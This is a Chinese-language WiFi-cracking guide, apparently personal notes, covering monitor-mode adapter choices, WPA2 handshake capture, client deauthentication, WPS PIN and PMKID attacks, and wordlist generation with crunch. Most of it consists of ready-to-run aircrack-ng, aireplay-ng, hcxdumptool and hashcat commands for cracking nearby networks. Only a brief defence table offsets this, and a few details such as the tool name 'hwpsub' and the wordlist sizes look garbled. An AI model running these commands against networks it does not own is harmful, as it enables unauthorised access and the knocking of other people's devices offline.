# 📡 WiFi破解 — 完整攻防知识库

## ⚠️ 前置条件
**这台Dell没有WiFi网卡**，要实操需要：
- 选项A: 买外置USB网卡 **Alfa AWUS036ACH** (~¥150)，支持Monitor Mode
- 选项B: 用你的**Mac上的Kali** + 内置WiFi网卡
- 选项C: 用你的Mac买同款外置网卡

## 🛠️ 工具链全景

```
┌─────────────────────────────────────────────────────┐
│                WiFi破解完整流程                        │
├─────────────────────────────────────────────────────┤
│                                                      │
│  ① 监听模式     → airmon-ng start wlan0             │
│  ② 扫描AP+客户端 → airodump-ng wlan0mon              │
│  ③ 抓握手包      → airodump-ng -c CH --bssid MAC     │
│                    -w capture wlan0mon                │
│  ④ 取消认证(可选) → aireplay-ng -0 5 -a AP_MAC       │
│                    -c CLIENT_MAC wlan0mon             │
│  ⑤ 破解密码      → aircrack-ng -w wordlist.txt       │
│                    capture.cap                       │
│  ⑥ GPU加速破解   → hashcat -m 22000 capture.hc22000  │
│                    -a 0 rockyou.txt                   │
└─────────────────────────────────────────────────────┘
```

## 1️⃣ 必备硬件 — 支持Monitor Mode的USB网卡

### 推荐网卡（兼容Kali Linux）

| 网卡 | 芯片 | 价格 | 优点 |
|------|------|------|------|
| **Alfa AWUS036ACH** | RTL8812AU | ~¥150 | ✅ 5GHz+2.4GHz, 经典款, Kali免驱 |
| **Alfa AWUS036ACM** | RTL8821AU | ~¥120 | ✅ USB-C, 更小巧 |
| **Panda PAU09** | RTL8812AU | ~¥100 | ✅ 性价比高 |
| TP-Link TL-WN722N v1 | AR9271 | ~¥80 | ⚠️ 仅2.4GHz, 停产v1才支持 |
| **Panda PAU05** | RTL8188EU | ~¥60 | ✅ 最便宜, 仅2.4GHz |

**推荐买 Alfa AWUS036ACH** — Kali直接识别，2.4G+5G双频，淘宝约¥150

### 不推荐的网卡
- ❌ Intel内置WiFi网卡（很多不支持Monitor Mode）
- ❌ Realtek RTL8188CU（驱动难装）
- ❌ 所有Broadcom芯片

## 2️⃣ 攻击模式

### 模式A: WPA2-PSK 字典破解（最常见）
```
目标: 有密码的WiFi网络
条件: 抓到4次握手包
方法: aircrack-ng / hashcat + 字典
成功率: 取决于密码强度
```

### 模式B: WPA3 破解
```
目标: WPA3网络（目前很少，新路由器支持）
难点: 需要SAE握手，不支持传统aireplay-ng取消认证
方法: 用bettercap或hwpsub针对WPA3的Dragonblood漏洞
成功率: 低
```

### 模式C: WPS PIN码破解
```
目标: 开了WPS的路由器
工具: reaver / bully / pixiewps
条件: WPS未锁定
漏洞: 2012年大量路由器存在PIN码暴力漏洞
成功率: 老路由器高, 新路由器基本已封
```

### 模式D: PMKID攻击（不需客户端）
```
目标: 支持漫游功能的路由器（PMKID在探测帧里）
优点: ❌不需要有客户端连接 → 可以单机破解
       ❌不需要抓握手包
       ❌不需要取消认证
工具: hcxdumptool + hcxpcapngtool + hashcat
条件: 路由器发送PMKID（RSN IE的PMKID字段）
成功率: 对华为/TP-Link部分型号有效
```

## 3️⃣ 准备工具

```bash
# 在Kali上（已预装大部分工具）
# aircrack-ng套件
airmon-ng       # 开启监听模式
airodump-ng     # 扫描WiFi网络
aireplay-ng     # 取消认证/注入
aircrack-ng     # 破解WEP/WPA
airdecap-ng     # 解密抓包

# 补充工具
hashcat         # GPU加速密码破解（已装）
reaver          # WPS暴力破解
bully           # WPS暴力破解（更稳定）
hcxdumptool     # PMKID捕获
hcxpcapngtool   # 转hashcat格式
```

## 4️⃣ 字典准备

| 字典 | 大小 | 说明 |
|------|------|------|
| rockyou.txt | 14GB(完整) / 134MB(压缩) | 最常用的密码字典 |
| **WeakPass** | 常见弱密码 | 路由器默认密码 |
| **RouterDefaultPasswords** | 路由器出厂密码 | 各品牌默认密码 |
| **WiFi专用字典** | 8位数字+字母 | 国内WiFi常见: 8位数字 |

### WiFi字典生成
```bash
# 生成8位纯数字WiFi常用密码（约1亿条，860MB）
crunch 8 8 0123456789 -o wifi_num.txt

# 手机号常见前缀（13X/15X/18X开头的8位）
crunch 8 8 0123456789 -t 138%%%%% -o wifi_138.txt
```

## 5️⃣ 最佳WiFi攻防学习路线

```
第1步: 装Kali（Mac已有 ✅）
第2步: 买外置网卡 Alfa AWUS036ACH（~¥150）
第3步: 装aircrack-ng套件检查（Kali预装）
第4步: 开监听模式扫周围WiFi（了解环境）
第5步: 用自己的路由器练习抓握手包
第6步: 用hashcat跑字典破解
第7步: 尝试PMKID攻击（不需客户端）
第8步: 学WPA3攻击（Dragonblood）
```

## 6️⃣ 实战命令速查

### 扫描周边WiFi
```bash
# 开监听模式
sudo airmon-ng start wlan0

# 扫描全部WiFi
sudo airodump-ng wlan0mon

# 扫描特定信道+保存
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
```

### 抓握手包
```bash
# 方法1: 等客户端自动连接（被动）
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w handshake wlan0mon

# 方法2: 取消认证踢客户端下线→自动重连接（主动）
sudo aireplay-ng -0 2 -a AP_MAC -c CLIENT_MAC wlan0mon
```

### 破解
```bash
# aircrack-ng直接破
aircrack-ng -w rockyou.txt handshake.cap

# hashcat GPU加速（先转格式）
hcxpcapngtool -o handshake.hc22000 capture.cap
hashcat -m 22000 handshake.hc22000 rockyou.txt
```

## 7️⃣ 防御建议（知己知彼）

| 防御措施 | 防什么 | 效果 |
|---------|--------|------|
| WPA3加密 | 字典破解+PMKID | 🟢 最强 |
| WPA2+AES（不选TKIP） | 降低破解成功率 | 🟢 |
| 20位以上随机密码 | 字典破解无效 | 🟢 |
| 关闭WPS | 防PIN码破解 | 🟢 |
| 关闭WiFi漫游 | 防PMKID攻击 | 🟡 |
| MAC地址过滤 | 防蹭网（可绕过） | 🟡 |
| 隐藏SSID | 防被发现（可扫到） | 🔴 没用 |
